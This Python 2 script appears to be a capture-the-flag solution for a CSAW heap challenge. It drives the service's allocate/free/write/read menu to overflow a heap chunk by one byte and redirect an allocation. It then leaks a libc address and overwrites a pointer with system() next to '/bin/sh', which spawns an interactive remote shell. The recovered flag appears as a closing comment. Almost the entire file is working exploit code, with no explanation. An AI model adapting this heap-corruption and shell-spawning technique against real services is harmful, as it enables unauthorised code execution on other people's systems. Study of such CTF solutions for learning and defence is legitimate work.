import socket, struct, os, binascii, base64, time
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)


def do_alloc(sc, size):
    read_until(sc, "5) Exit\n")
    sc.send("1\n")
    sc.send(str(size) + "\n")
    
def do_free(sc):
    read_until(sc, "5) Exit\n")
    sc.send("2\n")
    
def do_write(sc, data):
    read_until(sc, "5) Exit\n")
    sc.send("3\n")
    time.sleep(1)
    sc.send(data)
    
def do_read(sc):
    read_until(sc, "5) Exit\n")
    sc.send("4\n")
    
def do_exit(sc):
    read_until(sc, "5) Exit\n")
    sc.send("5\n")
    


sc = socket.create_connection(("pwn.chal.csaw.io", 5223))
offset_system = 0x34e390
offset_runtime_resolve = 0xc82e50

# sc = socket.create_connection(("10.0.0.49", 12345))
# offset_runtime_resolve = 0xc82870

# offset_puts = 0x36c990
# offset_gadget = 0xd7117
# offset_system = 0x342490
# offset_runtime_resolve = 0xbe12b0

read_until(sc, "Environment setup: 0x")
env_addr = int(readline(sc, False), 16)
print hex(env_addr)

do_alloc(sc, 0x40)
do_write(sc, "X" * 0x40 + "\x80")
do_alloc(sc, 0x40)
do_free(sc)
do_alloc(sc, 0x80)
do_write(sc, "X" * 0x40 + Q(0x40) + Q(0x607000) + "\n")
do_alloc(sc, 0x40)
do_alloc(sc, 0x40)
do_read(sc)
libc_offset = struct.unpack("<Q", readline(sc, False).ljust(8, "\x00"))[0]
print hex(libc_offset)
libc_base = libc_offset - offset_runtime_resolve

do_write(sc, "/bin/sh\x00".ljust(16, "\x00") + Q(libc_base + offset_system) + "\n")

time.sleep(1)
sc.send("4" + "\n")

print "interactive"

t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    
    
# flag{d0n7_let_m3_g3t_1n_my_z0n3}